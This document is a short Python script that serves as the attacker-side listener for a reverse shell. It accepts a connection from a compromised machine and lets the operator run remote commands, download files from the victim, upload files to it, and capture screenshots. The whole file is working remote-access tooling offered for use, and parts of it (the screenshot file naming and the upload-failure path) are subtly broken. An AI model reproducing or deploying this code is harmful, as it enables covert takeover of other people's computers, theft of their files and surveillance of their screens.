#!/usr/bin/python3
import socket
from termcolor import colored
import json
from sys import exit
import base64

addr = None
HOST = '192.168.0.94'
PORT = 54321
count = 1


def reliable_send(_target, _cmd):
    if type(_cmd) is bytes:
        _cmd = _cmd.decode('UTF-8')
    json_data = json.dumps(_cmd)
    _target.sendall(json_data.encode('UTF-8'))


def reliable_recv(_target):
    data = ""
    while True:
        try:
            data = data + (_target.recv(1024)).decode('UTF-8')
            return json.loads(data)
        except ValueError:
            continue


def shell(_s, _target, _addr):
    global count
    while True:
        cmd = input('* Shell#~%s: ' % str(_addr))
        reliable_send(_target, cmd)
        if cmd == 'q':
            print(colored('[-] You decided to exit', 'red'))
            _target.close()
            _s.close()
            exit(0)
            break
        elif cmd[:2] == 'cd' and len(cmd[3:]) > 1:
            # reliable_send(_target, 'pwd') # if linux
            # reliable_send(_target, 'cd')  # if windows
            # result = reliable_recv(_target)
            # print('Changed to directory: ', result)
            continue
        elif cmd[:3] == 'get' and len(cmd[4:]) > 1:
            with open(cmd[4:], 'wb') as f:
                file_data = reliable_recv(_target)
                f.write(base64.b64decode(file_data))
                f.close()
        elif cmd[:4] == 'send' and len(cmd[5:]) > 1:
            try:
                with open(cmd[5:], 'rb') as f:
                    file_data = f.read()
                    reliable_send(_target, base64.b64encode(file_data))
            except:
                failed = 'Failed to Upload'
                reliable_send(_target, base64.b64encode(failed))
        elif cmd[:10] == 'screenshot':
            temp_name = "screenshoot" + _addr + "_" + count + ".png"
            with open(temp_name, 'wb') as sc:
                png_data = reliable_recv(_target)
                sc.write(base64.b64decode(png_data))
                sc.close()
            count += 1
        else:
            result = reliable_recv(_target)
            print('------------------\n', result, '------------------\n')


def server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen(5)  # how many connections - 5
        print(colored('[+] Listening for Incoming Connections', 'green'))
        target, addr = s.accept()
        print(colored('[+] Connection Established From: %s' % str(addr), 'green'))
        with target:
            shell(s, target, addr)


server()
